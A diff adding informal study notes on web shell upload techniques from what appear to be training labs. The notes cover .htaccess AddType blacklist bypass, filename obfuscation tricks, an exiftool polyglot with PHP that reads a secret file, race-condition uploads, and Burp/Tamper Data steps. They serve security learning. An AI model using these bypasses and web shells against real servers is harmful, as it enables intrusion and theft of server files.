@@ -10,3 +10,122 @@ Web shell upload via path traversal:
 -file not found
 -url encode the ../ and add it to shell.php
 
+method 4:
+Web shell upload via file extension blacklist:
+why this happens?
+Insufficient blacklisting of dangerous file types
+One of the most obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file 
+extensions like .php. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file 
+extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions
+that may still be executable, such as .php5, .shtml, and so on.
+
+-upload an image file
+-go to post req and send it repeater
+-set filename: shell.php
+- php echo file get contents ....
+-we'll see 403 forbidden msg
+-we can see the server name: apche...
+-go to Apache's website
+-the .htaccess file is the one add restriction or approval on a file type.. so we're goin to edit that file configuration
+-set the filename:.htaccess
+-content type: text/plain
+-Addtype application/x-httpd-php .shell(basically we're making a rule that says .shell file will be run as php code)
+-great we've changed the apache configuration
+-go to that post req again and rename the filename :shell.shell
+-send it to the server
+-congratulation blud, the lab is solved
+
+
+
+method 5:
+Webshell upload via obfuscated file extension:
+obfuscation(unclear) technique:
+Obfuscating file extensions:
+Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. 
+Let's say the validation code is case sensitive and fails to recognize that exploit.pHp is in fact a .php file.
+If the code that subsequently maps the file extension to a MIME type is not case sensitive, this discrepancy allows
+you to sneak malicious PHP files past validation that may eventually be executed by the server.
+
+You can also achieve similar results using the following techniques:
+
+-Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be
+interpreted as either a PHP file or JPG image: exploit.php.jpg
+
+-Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: exploit.php.
+
+-Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't 
+decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files 
+that would otherwise be blocked: exploit%2Ephp
+
+-Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a
+high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, 
+for example, this can cause discrepancies in what is treated as the end of the filename: exploit.asp;.jpg or exploit.asp%00.jpg
+
+-Try using multibyte unicode characters, which may be converted to null bytes and dots after uni code conversion or
+normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, 
+but then converted to ASCII characters before being used in a path.
+Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed.
+If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension.
+For example, consider what happens if you strip .p hp from the following filename:
+
+exploit.p.phphp
+
+
+
+method 6:
+Remote code execution via polyglot(বহুভাষীক) web shell upload:
+manipulating the image files metadata;
+-exiftool images.jpeg
+-add comment by "exiftool -comment="test" images.jpeg"
+-the comment value will be added to the metadata
+-exiftool -comment=" <?php echo 'look here for interesting part'.file_get_contents('/home/carlos/secret').' the secret is to the left'; ?>" images.jpeg
+-make a polyglot by this   
+exiftool -comment=" <?php echo 'look here for interesting part'.file_get_contents('/home/carlos/secret').' the secret is to the left'; ?>"images.jpeg -o webshell.php 
+-upload that 
+-go to burp and find the get req with that webshell.php 
+-in the response you'll find the secret 
+
+
+method 7:
+Web shell upload via race condition:
+#race condition happens when two or multiple proccesse's try to access the same data at the same time
+-upload an image and open image  location of that dir .../avatar/fef.jpg
+-upload the shell
+-see that shell dir /avatar/shell.php
+-even if the server blacklist our extension, what we're trusting is that it's gonna store it for few miliseconds and in that time we're gonna quickly access it
+-the shell won't be uploaded 
+-go to burp, and look for the get and post req and send them to repeater 
+-group them and duplicate the get req 5 times and send req in parallel
+-the lab will be solved
+
+
+method 8:
+Arena class:
+Bypassing using uploadscanner:
+
+-install jaython in burp
+-install uploadscanner
+-first upload a valid file 
+-send that post req to repeater 
+-then after seeing response, send it to uploadscanner (PHp,fingerping)
+-start scan with redownloader, then go to flow 
+-look for the links that says " finished creating"
+-then inject  php code in the garbage values
+-then look for the shell
+
+
+
+method 9:
+Arena class:
+webshell upload using temper data:
+-first try to upload .php shells 
+-rename u.php to u.php.jpg
+-the shell wont get executed 
+-go to cyberfox-tools-temperdata
+-start tempering and the upload
+-click temper and then look for u.php.jpg and then remove .jpg
+
+
+
+
+
